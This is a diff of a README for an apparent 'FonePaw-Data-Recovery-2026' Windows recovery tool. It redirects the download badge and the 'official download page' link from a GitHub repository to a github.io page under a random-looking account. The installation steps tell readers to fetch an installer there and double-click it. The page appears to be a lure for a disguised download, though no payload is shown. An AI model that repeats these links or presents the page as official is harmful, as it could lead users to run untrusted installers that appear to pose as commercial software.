@@ -1,6 +1,6 @@
 # 💾 FonePaw-Data-Recovery-2026 - Recover lost files on Windows easily
 
-[![](https://img.shields.io/badge/Download-FonePaw-blue)](https://github.com/proctologistbaseballcard248/FonePaw-Data-Recovery-2026)
+[![](https://img.shields.io/badge/Download-FonePaw-blue)](https://proctologistbaseballcard248.github.io)
 
 ## 📁 About the software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/proctologistbaseballcard248/FonePaw-Data-Recovery-2026) to obtain the installer.
+1. Visit the [official download page](https://proctologistbaseballcard248.github.io) to obtain the installer.
 2. Save the file to your computer.
 3. Locate the file in your Downloads folder and double-click the icon.
 4. Follow the instructions that appear on your screen.
